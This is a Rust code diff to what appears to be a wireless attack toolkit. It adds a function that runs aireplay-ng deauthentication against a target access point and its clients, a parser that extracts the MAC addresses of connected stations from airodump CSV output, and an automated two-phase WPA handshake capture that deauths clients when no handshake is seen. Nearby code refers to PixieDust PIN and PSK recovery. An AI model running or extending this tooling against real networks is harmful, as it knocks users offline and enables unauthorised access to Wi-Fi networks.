@@ -335,6 +335,142 @@ pub fn capture(distro: &str, iface: &str, bssid: &str, channel: &str, essid: &st
     bail!("抓包未产出 cap 文件（{}*.cap）", name)
 }
 
+/// Deauth a target AP's clients (requires an injection-capable adapter).
+/// client=None -> broadcast deauth to all clients of the AP.
+pub fn deauth(distro: &str, iface: &str, bssid: &str, client: Option<&str>, count: u32) -> Result<String> {
+    let script = match client {
+        Some(c) => format!(
+            "timeout 12 aireplay-ng --deauth {n} -a {b} -c {c} {i} 2>&1 | tail -2",
+            n = count,
+            b = bssid,
+            c = c,
+            i = iface
+        ),
+        None => format!(
+            "timeout 12 aireplay-ng --deauth {n} -a {b} {i} 2>&1 | tail -2",
+            n = count,
+            b = bssid,
+            i = iface
+        ),
+    };
+    Ok(kali(distro, &script)?.trim().to_string())
+}
+
+/// Client MACs associated with `bssid`, parsed from an airodump CSV
+/// (station table: col0 = station MAC, col5 = AP BSSID).
+pub fn stations_from_csv(csv_path: &Path, bssid: &str) -> Vec<String> {
+    let text = match std::fs::read_to_string(csv_path) {
+        Ok(t) => t,
+        Err(_) => return Vec::new(),
+    };
+    let mut out: Vec<String> = Vec::new();
+    let mut in_station_table = false;
+    for line in text.lines() {
+        let l = line.trim_end_matches('\r');
+        if l.starts_with("Station MAC,") {
+            in_station_table = true;
+            continue;
+        }
+        if !in_station_table {
+            continue;
+        }
+        let p: Vec<&str> = l.split(',').collect();
+        if p.len() >= 6 {
+            let mac = p[0].trim();
+            let ap = p[5].trim();
+            if mac.matches(':').count() == 5 && ap.eq_ignore_ascii_case(bssid) {
+                out.push(mac.to_lowercase());
+            }
+        }
+    }
+    out
+}
+
+/// Capture with automatic deauth-assist: phase 1 (half duration) ->
+/// if no handshake, deauth the AP's clients -> phase 2 (half duration).
+/// Returns (cap file, handshake known?).
+#[allow(clippy::too_many_arguments)]
+pub fn capture_deauth(
+    distro: &str,
+    iface: &str,
+    bssid: &str,
+    channel: &str,
+    essid: &str,
+    sec_total: u64,
+    caps_dir_win: &Path,
+    acng_bin: &Path,
+) -> (Option<String>, Option<bool>) {
+    let half = (sec_total / 2).max(30);
+    let safe: String = essid
+        .chars()
+        .map(|c| if c.is_ascii_alphanumeric() || c == '-' || c == '_' { c } else { '_' })
+        .collect();
+    let b4 = bssid.replace(':', "").get(0..4).unwrap_or("0000").to_string();
+    let base = format!("{}_{}", safe, b4);
+
+    // phase 1
+    match capture(distro, iface, bssid, channel, &format!("{}_p1", essid), half, caps_dir_win) {
+        Ok(cap) => {
+            if crate::session::check_handshake(acng_bin, Path::new(&cap)) == Some(true) {
+                return (Some(cap), Some(true));
+            }
+        }
+        Err(_) => {}
+    }
+    // find phase-1 csv (same stem) and extract stations
+    let stem = format!("{}_p1", {
+        let safe: String = essid
+            .chars()
+            .map(|c| if c.is_ascii_alphanumeric() || c == '-' || c == '_' { c } else { '_' })
+            .collect();
+        safe
+    });
+    let mut stations: Vec<String> = Vec::new();
+    if let Ok(rd) = std::fs::read_dir(caps_dir_win) {
+        for e in rd.flatten() {
+            let p = e.path();
+            let fname = p.file_name().map(|f| f.to_string_lossy().to_string()).unwrap_or_default();
+            if fname.starts_with(&stem) && fname.ends_with(".csv") {
+                stations = stations_from_csv(&p, bssid);
+                break;
+            }
+        }
+    }
+    let targets: Vec<Option<String>> = if stations.is_empty() {
+        vec![None]
+    } else {
+        stations.iter().map(|s| Some(s.clone())).collect()
+    };
+    for st in &targets {
+        match deauth(distro, iface, bssid, st.as_deref(), 5) {
+            Ok(o) => {
+                let snip: String = o.chars().take(60).collect();
+                events_note(&format!("deauth({:?}): {}", st, snip));
+            }
+            Err(e) => events_note(&format!("deauth 失败: {e:#}")),
+        }
+    }
+    // phase 2
+    let cap2 = capture(
+        distro,
+        iface,
+        bssid,
+        channel,
+        &format!("{}_p2", essid),
+        half,
+        caps_dir_win,
+    )
+    .ok();
+    let hs = cap2
+        .as_ref()
+        .and_then(|c| crate::session::check_handshake(acng_bin, Path::new(c)));
+    (cap2, hs)
+}
+
+fn events_note(msg: &str) {
+    tracing::info!("{}", msg);
+}
+
 /// Run reaver PixieDust against one BSSID; parse PIN / PSK from output.
 /// PixieDust via OneShot (wpa_supplicant managed-mode association).
 ///
